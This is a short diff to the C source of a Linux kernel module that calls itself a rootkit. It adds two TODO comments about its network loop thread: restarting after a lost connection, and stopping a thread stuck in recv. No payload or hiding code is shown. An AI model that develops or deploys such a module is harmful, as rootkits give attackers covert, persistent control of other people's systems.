@@ -30,6 +30,7 @@ static __init int rootkit_init(void)
         return PTR_ERR(thread);
     }
 
+    // TODO: if thread exits because connection lost, start over.
     pr_info("rootkit: started network loop thread.\n");
     return 0;
 }
@@ -38,6 +39,7 @@ static __exit void rootkit_exit(void)
 {
     if (thread)
     {
+        // TODO: find some way to stop thread even if it's stopped at a recv.
         kthread_stop(thread);
     }
     network_exit();
